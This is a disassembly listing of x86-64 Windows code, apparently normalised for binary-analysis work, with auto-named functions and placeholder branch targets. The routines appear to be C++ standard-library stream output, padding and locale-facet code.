movzx eax [ r13 ]
cmp al 0x2b
je r-xdata
xor edx edx
lea rcx [ rbp - 0x71 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
movsxd r14 r12d
lea rax [ rbp - 0x29 ]
mov rcx [ rbp - 0x29 ]
mov rdx [ rbp - 0x11 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x7f
je r-xdata
cmp al 0x2d
je r-xdata
xor ebx ebx
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rbp - 0x71 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rbp - 0x59 ]
mov rdi [ rax + 0x28 ]
test rdi rdi
jle r-xdata
lea rax [ rbp - 0x29 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x0
jle r-xdata
cmp al 0x30
jne r-xdata
mov rax [ rbx ]
mov edx r12d
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
xor edi edi
cmp rdi r15
jbe r-xdata
lea r12 [ rbp - 0x29 ]
cmp rdx 0x10
cmovae r12 rcx
mov rdi r15
movzx eax [ r12 ]
cmp al 0x7f
je r-xdata
xor r12d r12d
movzx eax [ r13 + 0x1 ]
cmp al 0x78
je r-xdata
mov r12 [ rbp - 0x79 ]
cmp eax 0x100
je r-xdata
sub rdi r15
jmp r-xdata
test al al
jle r-xdata
mov r12d 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov rbx [ rbp - 0x49 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x11 ] 0x10
jb r-xdata
mov rbx [ rsp + 0x38 ]
nop
mov rax [ rbp - 0x79 ]
movups xmm0 [ rax ]
movaps [ rsp + 0x30 ] xmm0
mov r13 r14
mov r12 [ rbp - 0x69 ]
test r14 r14
je r-xdata
mov r12 [ rbp - 0x79 ]
movups xmm0 [ r12 ]
movaps [ rbp - 0x69 ] xmm0
test rdi rdi
je r-xdata
mov eax [ rax + 0x18 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
movsx rcx al
mov rax rdi
sub rax r14
cmp rcx rax
jae r-xdata
mov rax rbx
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x29 ]
call j_sub_14003ad04
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov r12 [ rbp - 0x79 ]
movups [ r12 ] xmm0
mov r13 [ rbp - 0x69 ]
add r13 r14
sub r15 r14
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x38 ]
nop [ rax ] eax
movups [ r12 ] xmm0
xor edi edi
jmp r-xdata
mov rbx [ rbp - 0x61 ]
nop [ rax + rax ] eax
sub rdi rcx
mov rdx r15
sub rdx rdi
inc rdx
lea rbx [ r13 + rdi ]
lea rcx [ r13 + rdi + 0x1 ]
mov r9 rdx
mov r8 rbx
call sub_14003b7c8
mov [ rbx ] 0x0
inc r15
lea rax [ r12 + 0x1 ]
cmp [ rax ] 0x0
cmovg r12 rax
movzx eax [ r12 ]
cmp al 0x7f
jne r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx sil
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movups [ r12 ] xmm0
xor edi edi
jmp r-xdata
mov rbx [ rsp + 0x38 ]
nop [ rax ] eax
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movups xmm0 [ r12 ]
movaps [ rsp + 0x30 ] xmm0
mov rcx [ rbp - 0x41 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov [ rsp + 0x20 ] al
mov r9 r15
mov r8 r13
lea rdx [ rsp + 0x30 ]
lea rcx [ rbp - 0x41 ]
call sub_14002afe0
mov r11 rax
mov rax [ rax ]
mov [ r12 ] rax
mov rax [ r11 + 0x8 ]
mov [ r12 + 0x8 ] rax
mov rax [ rbp - 0x59 ]
mov [ rax + 0x28 ] 0x0
movups xmm0 [ r12 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
mov [ rbp - 0x69 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] sil
movzx eax sil
jmp r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movzx r8d [ r12 ]
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx r8b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rbp - 0x69 ]
movzx edx sil
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp eax 0xffffffff
jne r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx sil
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
inc r12
dec r13
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] sil
movzx eax sil
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] sil
movzx eax sil
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_14002aee0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x20 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] al
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_140005c90
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14002af30
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x28 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] al
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_140005c90
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14002af80
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rdi rcx
mov ebx edx
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
call j_sub_14003ad04#2
mov rcx [ rdi + 0x20 ]
call j_sub_14003ad04#2
mov rcx [ rdi + 0x28 ]
call j_sub_14003ad04#2
lea r11 [ r--data ]
mov [ rdi ] r11
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_14002afe0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
movzx r14d [ rsp + 0xa0 ]
movaps [ rsp + 0x40 ] xmm6
mov r13 r9
mov r12 r8
mov r15 rdx
nop [ rax + rax ] eax
mov rbp r13
sub rbp r12
jmp r-xdata
add r12 rbp
sub r13 rbp
movups [ r15 ] xmm6
je r-xdata
test rbx rbx
je r-xdata
movups xmm6 [ r15 ]
mov rdi rbp
mov rsi r12
movaps [ rsp + 0x20 ] xmm6
mov rbx [ rsp + 0x28 ]
test rbp rbp
je r-xdata
mov rax [ rsp + 0x80 ]
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
movups [ rax ] xmm6
movaps xmm6 [ rsp + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
test r14b r14b
je r-xdata
mov [ rsp + 0x20 ] 0x1
mov rax [ rbx + 0x48 ]
movzx r8d [ rsi ]
cmp [ rax ] 0x0
je r-xdata
inc r12
dec r13
jmp r-xdata
movaps [ rsp + 0x30 ] xmm6
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x20 ]
mov rax [ rbx ]
movzx edx r8b
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov r8 r13
xor edx edx
mov rcx r12
call sub_14003b840
mov rbp rax
test rax rax
je r-xdata
mov [ rsp + 0x30 ] 0x1
movaps xmm6 [ rsp + 0x30 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
inc rsi
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
mov rax [ rbx ]
movzx edx r14b
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp eax 0xffffffff
jne r-xdata
movups [ r15 ] xmm6
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r14b
movzx eax r14b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_14002b170
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x80 ] rbx
mov r12 rdx
mov rsi rcx
xor ebx ebx
mov [ rsp + 0x78 ] ebx
mov r13 [ rdx + 0x10 ]
mov rax [ rcx ]
movsxd rcx [ rax + 0x4 ]
mov rdi [ rcx + rsi + 0x28 ]
test rdi rdi
jle r-xdata
xor edi edi
cmp rdi r13
jbe r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub rdi r13
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
jne r-xdata
mov rcx [ rcx + rsi + 0x50 ]
test rcx rcx
je r-xdata
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov rcx [ rcx + rsi + 0x48 ]
test rcx rcx
je r-xdata
mov eax [ rcx + rsi + 0x18 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
call sub_1400103c0
cmp [ r12 + 0x18 ] 0x10
jb r-xdata
test rdi rdi
je r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
mov r8 r13
mov rdx r12
call [ rax + 0x48 ]
cmp rax r13
je r-xdata
mov r12 [ r12 ]
test ebx ebx
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
test rdi rdi
je r-xdata
mov ebx 0x4
jmp r-xdata
movzx edx r8b
mov rax [ rcx ]
call [ rax + 0x18 ]
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ r14 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r14 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r14
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rsi + 0x28 ] 0x0
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x78 ] ebx
dec rdi
jmp r-xdata
or ebx 0x4
mov [ rsp + 0x78 ] ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
mov rax rsi
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
movzx edx r8b
mov rax [ rcx ]
call [ rax + 0x18 ]
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp eax 0xffffffff
jne r-xdata
dec rdi
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_14002b3a0
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov rsi rcx
xor ebx ebx
mov [ rsp + 0x68 ] ebx
mov rax [ rcx ]
movsxd rcx [ rax + 0x4 ]
mov rdi [ rcx + rsi + 0x28 ]
test rdi rdi
jle r-xdata
xor edi edi
cmp rdi 0xb
jle r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
add rdi 0xfffffffffffffff5
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
jne r-xdata
mov rcx [ rcx + rsi + 0x50 ]
test rcx rcx
je r-xdata
mov r12 rsi
mov [ rsp + 0x28 ] rsi
mov rcx [ rcx + rsi + 0x48 ]
test rcx rcx
je r-xdata
mov eax [ rcx + rsi + 0x18 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
call sub_1400103c0
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
mov r8d 0xb
lea rdx [ r--data ]
call [ rax + 0x48 ]
cmp rax 0xb
je r-xdata
test rdi rdi
jle r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
test rdi rdi
jle r-xdata
mov ebx 0x4
jmp r-xdata
test ebx ebx
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rsi + 0x28 ] 0x0
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x68 ] ebx
movzx edx r8b
mov rax [ rcx ]
call [ rax + 0x18 ]
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ r12 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r12 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r12
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
movzx edx r8b
mov rax [ rcx ]
call [ rax + 0x18 ]
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
dec rdi
jmp r-xdata
or ebx 0x4
mov [ rsp + 0x68 ] ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
mov rax rsi
mov rbx [ rsp + 0x70 ]
add rsp 0x40
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
dec rdi
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_14002b5d0
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_14003825c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_140037e88
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_14002b870
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003a7f8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rcx rbx
call sub_140037db8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_14002b720
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_14003825c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_140037e88
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_14002b990
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003a7f8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rcx rbx
call sub_140037db8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_14002b870
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov rbp rdx
mov rsi rcx
xor r12d r12d
mov edi r12d
mov [ rsp + 0x90 ] r12d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x4
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
lea ecx [ r12 + 0x18 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x90 ] rax
test rax rax
je r-xdata
mov rbx r12
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140037f70
nop
mov rcx [ rsp + 0x60 ]
test rcx rcx
je r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140002990
mov edi 0x1
mov [ rbx + 0x8 ] r12
lea rax [ r--data ]
mov [ rbx ] rax
call sub_140037a98
mov [ rbx + 0x10 ] rax
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rsp + 0x60 ] r12
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rsp + 0x50 ] r12
mov rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x40 ] r12
mov rcx [ rsp + 0x30 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x30 ] r12
lea rcx [ rsp + 0x28 ]
call sub_14003828c
call sub_14003ad04
sub_14002b990
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rbp
mov rbp rdx
mov rsi rcx
xor r12d r12d
mov edi r12d
mov [ rax + 0x8 ] r12d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x4
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
lea ecx [ r12 + 0x30 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0xa0 ] rax
test rax rax
je r-xdata
mov rbx r12
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140037f70
nop
mov rcx [ rsp + 0x60 ]
test rcx rcx
je r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140002990
nop
mov edi 0x1
mov [ rsp + 0x90 ] edi
mov [ rbx + 0x8 ] r12
lea rax [ r--data ]
mov [ rbx ] rax
mov rcx rbx
call sub_14002bab0
nop
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rsp + 0x60 ] r12
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rsp + 0x50 ] r12
mov rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x40 ] r12
mov rcx [ rsp + 0x30 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x30 ] r12
lea rcx [ rsp + 0x28 ]
call sub_14003828c
call sub_14003ad04
sub_14002bab0
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x60 ] rsi
mov rsi rcx
mov r13b 0x1
call sub_14003b85c
mov r12 rax
xor eax eax
mov [ rsi + 0x10 ] rax
mov [ rsi + 0x20 ] rax
mov [ rsi + 0x28 ] rax
lea rdi [ r--data ]
call sub_140037a98
mov ebx 0x1
mov ecx ebx
call j_sub_14003ac60
mov rdx rax
mov [ rsi + 0x10 ] rax
call sub_140037a98
lea rdi [ r--data ]
mov ebx 0x6
mov ecx ebx
call j_sub_14003ac60
mov rdx rax
nop [ rax ] eax
movzx ecx [ rdi ]
mov [ rdx ] cl
dec rbx
inc rdx
inc rdi
jmp r-xdata
mov [ rsi + 0x20 ] rax
call sub_140037a98
lea rdi [ r--data ]
mov ebx 0x5
mov ecx ebx
call j_sub_14003ac60
mov rdx rax
movzx ecx [ rdi ]
mov [ rdx ] cl
dec rbx
inc rdx
inc rdi
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rsi + 0x28 ] rax
call sub_140037a98
mov rax [ r12 ]
movzx ecx [ rax ]
mov [ rsi + 0x18 ] cl
call sub_140037a98
mov rax [ r12 + 0x8 ]
movzx ecx [ rax ]
mov [ rsi + 0x19 ] cl
test r13b r13b
je r-xdata
movzx ecx [ rdi ]
mov [ rdx ] cl
dec rbx
inc rdx
inc rdi
jmp r-xdata
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
call sub_140037a98
mov [ rsi + 0x18 ] 0x2e
call sub_140037a98
mov [ rsi + 0x19 ] 0x2c
test rbx rbx
je r-xdata
sub_14002bbe0
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xb0
mov [ rbp - 0x31 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
mov rbx rcx
mov [ rbp - 0x29 ] rcx
xor edi edi
mov [ rbp - 0x39 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rbp - 0x39 ] 0x1
lea rax [ sub_14002bd40 ]
mov [ rbp - 0x19 ] rax
mov esi 0x7
mov [ rbp + 0x7 ] rsi
mov [ rbp - 0x11 ] di
mov rcx [ r--data ]
mov [ rbp - 0x11 ] rcx
mov eax [ r--data ]
mov [ rbp - 0x9 ] eax
mov [ rbp - 0x1 ] 0x6
lea rax [ rbp - 0x11 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xc ] di
mov [ rbp + 0x2f ] rsi
mov [ rbp + 0x27 ] rdi
mov [ rbp + 0x17 ] di
xor r8d r8d
lea edx [ rdi + 0xc ]
lea rcx [ rbp + 0x17 ]
call sub_1400025a0
lea r11 [ rbp + 0x17 ]
cmp [ rbp + 0x2f ] 0x8
cmovae r11 [ rbp + 0x17 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov [ rbp + 0x27 ] 0xc
lea rax [ rbp + 0x17 ]
cmp [ rbp + 0x2f ] 0x8
cmovae rax [ rbp + 0x17 ]
mov [ rax + 0x18 ] di
lea rdx [ rbp - 0x19 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0x2f ] 0x8
jb r-xdata
mov [ rbp + 0x2f ] rsi
